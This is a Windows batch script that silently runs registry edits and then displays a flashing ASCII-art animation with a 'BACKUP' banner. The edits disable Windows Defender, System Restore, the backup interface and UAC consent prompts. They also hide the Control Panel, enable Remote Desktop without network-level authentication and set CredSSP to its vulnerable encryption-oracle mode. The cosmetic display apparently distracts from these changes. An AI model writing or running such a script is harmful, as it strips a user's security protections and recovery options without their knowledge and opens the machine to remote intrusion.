echo off
color 3
@mode con cols=74 lines=5
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Backup\Client" /v "DisableBackupUI" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v "ClientCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\CredSSP\Parameters" /v "AllowEncryptionOracle" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v "UserAuthentication" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v "fDenyTSConnections" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
Reg.exe add "HKCR\*\shell\runas" /ve /t REG_SZ /d "Take Ownership" /f
Reg.exe add "HKCR\*\shell\runas" /v "NoWorkingDirectory" /t REG_SZ /d "" /f
Reg.exe add "HKCR\*\shell\runas\command" /ve /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F" /f
Reg.exe add "HKCR\*\shell\runas\command" /v "IsolatedCommand" /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F" /f
Reg.exe add "HKCR\Directory\shell\runas" /ve /t REG_SZ /d "Take Ownership" /f
Reg.exe add "HKCR\Directory\shell\runas" /v "NoWorkingDirectory" /t REG_SZ /d "" /f
Reg.exe add "HKCR\Directory\shell\runas\command" /ve /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" /r /d y && icacls \"%%1\" /grant administrators:F /t" /f
Reg.exe add "HKCR\Directory\shell\runas\command" /v "IsolatedCommand" /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" /r /d y && icacls \"%%1\" /grant administrators:F /t" /f

@mode con cols=72 lines=27

ping localhost -n 1 >nul
echo       .o oOOOOOOOo                                            OOOo
color 4
ping localhost -n 1 >nul
echo       Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
color 3
ping localhost -n 1 >nul
echo       OboO''''''''''''.OOo. .oOOOOOo.    OOOo.oOOOOOo..''''''''''OO
color 4
ping localhost -n 1 >nul
echo       OOP.oOOOOOOOOOOO 'POOOOOOOOOOOo.   `'OOOOOOOOOP,OOOOOOOOOOOB'
color 3
ping localhost -n 1 >nul
echo       `O'OOOO'     `OOOOo'OOOOOOOOOOO` .adOOOOOOOOO'oOOO'    `OOOOo
color 4
ping localhost -n 1 >nul
echo       .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
color 3
ping localhost -n 1 >nul
echo       OOOOO                 ''OOOOOOOOOOOOOOOO'`                oOO
color 4
ping localhost -n 1 >nul
echo      oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
color 3
ping localhost -n 1 >nul
echo     oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
color 4
ping localhost -n 1 >nul
echo    OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO'`  ''OOOOOOOOOOOOO.OOOOOOOOOOOOOO
color 3
ping localhost -n 1 >nul
echo    'OOOO'       'YOoOOOOMOIONODOO'`  .   ''OOROAOPOEOOOoOY'     'OOO'
color 4
ping localhost -n 1 >nul
echo       Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
color 3
ping localhost -n 1 >nul
echo       :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
color 4
ping localhost -n 1 >nul
echo       .            oOOP'%OOOOOOOOoOOOOOOO?oOOOOO?OOOO'OOo
color 3
ping localhost -n 1 >nul
echo                    '%o  OOOO'%OOOO%'%OOOOO'OOOOOO'OOO':
color 4
ping localhost -n 1 >nul
echo                         `$'  `OOOO' `O'Y ' `OOOO'  o             .
color 3
ping localhost -n 1 >nul
echo       .                  .     OP'          : o     .
color 4
ping localhost -n 1 >nul
echo                                 :
color 3
ping localhost -n 1 >nul
echo                                 .




ping localhost -n 2 >nul
echo    :::::::::      :::      ::::::::  :::    ::: :::    ::: ::::::::: 
ping localhost -n 2 >nul
echo    :+:    :+:   :+: :+:   :+:    :+: :+:   :+:  :+:    :+: :+:    :+:
ping localhost -n 2 >nul
echo    +:+    +:+  +:+   +:+  +:+        +:+  +:+   +:+    +:+ +:+    +:+
ping localhost -n 2 >nul
echo    +#++:++#+  +#++:++#++: +#+        +#++:++    +#+    +:+ +#++:++#+ 
ping localhost -n 2 >nul
echo    +#+    +#+ +#+     +#+ +#+        +#+  +#+   +#+    +#+ +#+       
ping localhost -n 2 >nul
echo    #+#    #+# #+#     #+# #+#    #+# #+#   #+#  #+#    #+# #+#       
ping localhost -n 2 >nul
echo    #########  ###     ###  ########  ###    ###  ########  ###       

ping localhost -n 8 >nul